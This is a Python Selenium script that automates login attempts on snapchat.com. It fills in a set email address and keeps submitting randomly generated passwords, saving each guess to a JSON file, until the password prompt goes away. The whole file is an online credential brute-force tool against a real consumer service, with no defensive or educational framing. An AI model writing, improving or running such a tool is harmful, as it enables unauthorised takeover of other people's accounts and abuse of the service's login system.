import requests
import string
import random
import time
import easyjson
from easyjson import core
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from bs4 import BeautifulSoup

chemin = "main.json"

email = ""

url = "https://snapchat.com"

def test_unit() -> str:
    req = requests.get(url)

    if req.status_code == 200:
        print("Envoie reussi no proxy")

    else:
        raise

def bruteforcing() -> str:
    caracteres = string.ascii_letters + string.digits

    longueur = random.randint(7, 12)
    combinaison = ''.join(random.choices(caracteres, k=longueur))

    print(combinaison)

    easyjson.append(chemin, combinaison)

    time.sleep(0.1)
    return combinaison

def scrap() -> None:
    driver = webdriver.Chrome()
    try:
        driver.get(url)

        wait = WebDriverWait(driver, 15)

        input_element = wait.until(
            EC.element_to_be_clickable((
                By.CSS_SELECTOR,
                'input[autocomplete="username"]'
            ))
        )
        input_element.click()
        input_element.clear()
        input_element.send_keys(email)

        submit_button = wait.until(
            EC.element_to_be_clickable((
                By.CSS_SELECTOR,
                'button[type="submit"]'
            ))
        )
        submit_button.click()

        while True:
            password_value = bruteforcing()
            if not password(driver, password_value):
                break
            time.sleep(1.5)
    finally:
        driver.quit()

def password(driver, password_value: str) -> bool:
    wait = WebDriverWait(driver, 15)
    try:
        password_input = wait.until(
            EC.element_to_be_clickable((
                By.CSS_SELECTOR,
                '#password, input[name="password"], input[type="password"]'
            ))
        )
        password_input.clear()
        password_input.send_keys(password_value)
        password_input.send_keys(Keys.ENTER)
        return True
    except TimeoutException:
        return False

if __name__ == "__main__":
    scrap()
